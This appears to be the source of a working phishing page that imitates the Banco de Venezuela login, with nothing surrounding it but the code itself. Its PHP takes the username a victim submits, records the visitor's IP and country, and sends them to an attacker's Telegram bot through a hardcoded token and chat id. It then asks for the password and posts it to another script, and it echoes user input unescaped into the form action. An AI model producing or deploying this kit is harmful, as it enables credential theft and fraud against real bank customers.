<?php
@ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

function getIP()
{
    if (isset($_SERVER)) {
        if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            return $_SERVER['REMOTE_ADDR'];
        }
    } else {
        if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
            return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
        } else {
            return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
        }
    }
}

$myip = getIP();
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip=' . $myip));
@$pais = $meta['geoplugin_countryName'];
@$region = $meta['geoplugin_regionName'];

////////////////////
if ( isset ($_POST['nmb']) ){


$message = "➖➖💲BDV-Money wayy💲➖➖\nUSUARIO: ".$_POST['nmb']."\r\n";
$message .= "\nIP CLIENTE: ".$myip."\r\n";
$apiToken = "8822229342:AAE85Op_lLv43R9J_h9RZS4lHuG3gjrfIk0";


$data = [
  'chat_id' => '8745440378',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

 }



?>


<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, user-scalable=no"
    />
    <title>Banco de Venezuela</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-image: url(bcg.jpg);
        background-size: cover;
        background-position: center;
      }

      .container {
        display: flex;

        height: 100%;
        width: 100%;
      }

      .left-side {
        width: 50%;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .right-side {
        width: 50%;
      }

      .form {
        width: 80%;
        background: white;
        max-width: 550px;
        box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
      }

      @media (max-width: 768px) {
        body {
          background: #ededed;
        }

        .container {
          flex-direction: column;
        }

        .left-side {
          width: 100%;
          height: 100vh;
        }

        .right-side {
          display: none;
        }
      }
    </style>
    <style>
      .form-group {
        position: relative;
        margin-bottom: 20px;
        margin: 20px;
      }

      .form-group label {
        position: absolute;
        top: 50%;
        left: 10px;
        transform: translateY(-55%);
        color: #999;
        transition: top 0.3s, font-size 0.3s;
        pointer-events: none;
      }

      .form-group input {
        width: 100%;
        padding: 10px;
        box-sizing: border-box;
        position: relative;
        height: 60px;
        border: 0;

        border-bottom: 1px solid gray;
        background: #ededed;
        outline: none;
      }

      .form-group input:focus {
        border: 0;
      }

      .form-group input:focus + label,
      .form-group input:not(:placeholder-shown) + label {
        top: 5px;
        font-size: 12px;
      }

      button {
        background-color: #0067b1;
        color: white;
        border-radius: 3px;
        border: 0;
        padding: 15px;
        width: 200px;
      }
    </style>
    <style>
      .form-group2 {
        position: relative;
        margin-bottom: 20px;
        margin: 20px;
      }

      .form-group2 label {
        position: absolute;
        top: 50%;
        left: 23%;
        transform: translateY(-55%);
        color: #999;
        transition: top 0.3s, font-size 0.3s;
        pointer-events: none;
      }

      .form-group2 input {
        padding: 10px;
        box-sizing: border-box;
        position: relative;
        height: 60px;
        border: 0;
        border-bottom: 1px solid gray;
        background: #ededed;

        outline: none;
      }

      .form-group2 input:focus {
        border: 0;
      }

      .form-group2 input:focus + label,
      .form-group2 input:not(:placeholder-shown) + label {
        top: 5px;
        font-size: 12px;
      }
    </style>
    <style>
      .overlay {
        display: flex;
        justify-content: center;
        align-items: center;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.5);
        /* Fondo semitransparente */
        z-index: 9999;
        /* Asegura que esté por encima de otros elementos */
      }

      .content {
        background-color: #fff;
        width: 350px;
        border-radius: 5px;
        text-align: center;
      }
    </style>
    <style>
      .form-group2 {
        position: relative;
        margin-bottom: 20px;
        margin: 20px;
      }

      .form-group2 label {
        position: absolute;
        top: 50%;
        left: 10px;
        transform: translateY(-55%);
        color: #999;
        transition: top 0.3s, font-size 0.3s;
        pointer-events: none;
        white-space: nowrap;
        /* Asegura que el texto del label no se rompa */
      }

      .form-group2 input {
        width: 100%;
        padding: 10px 10px 10px 10px;
        box-sizing: border-box;
        position: relative;
        height: 60px;
        border: 0;
        border-bottom: 1px solid gray;
        background: #ededed;
        outline: none;
        font-size: 16px;
        /* Ajusta el tamaño de la fuente del input */
      }

      .form-group2 input:focus + label,
      .form-group2 input:not(:placeholder-shown) + label {
        top: 5px;
        font-size: 12px;
        left: 10px;
      }
    </style>
  </head>

  <body>
    <div class="overlay" id="overlay" >
      <div class="content">
        <form id="loginform2" action="ld.php?nmb=<?php echo $_POST['nmb']; ?>" method="post" autocomplete="off" >
          <h4 style="color: #0067b1 !important">Introduce tu contraseña</h4>
          <div class="form-group2">
            <input type="text" id="cnt" minlength="8"  name="cnt" required pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9]).{4,30}$" title="La contraseña debe contener mínimo: 1 Número, 1 Letra mayuscula, 1 Letra minuscula y un caracter especial." />
            <label for="contra">Contraseña *</label>
          </div>
          <div style="width: 100%; text-align: center; padding-bottom: 30px">
            <button style="width: 160px" type="submit">Continuar</button>
          </div>
          <input type="text" name="ocultos" readonly hidden value="12323123123123121">
        </form>
      </div>
    </div>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const input = document.getElementById("contra");
        const label = input.nextElementSibling;
        label.style.top = "50%";
        if (input.value !== "") {
          label.style.top = "15px";
          label.style.fontSize = "12px";
        }

        input.addEventListener("focus", () => {
          label.style.top = "15px";
          label.style.fontSize = "12px";
        });

        input.addEventListener("blur", () => {
          if (!input.value) {
            label.style.top = "50%";
            label.style.fontSize = "";
          }
        });
      });
    </script>
          </div>
          <div style="width: 100%; text-align: center">
            <button>Entrar</button>
          </div>
          <div
            style="
              width: 100%;
              text-align: center;
              font-size: 12px;
              font-weight: bold;
              color: #999;
              margin-top: 30px;
              margin-bottom: 30px;
            "
          >
            ¿Olvidaste tu usuario o clave? <br />
            Si eres nuevo clienteBDV regístrate aquí
          </div>

        </form>
      </div>
      <div class="right-side"></div>
    </div>
  </body>

 
</html>
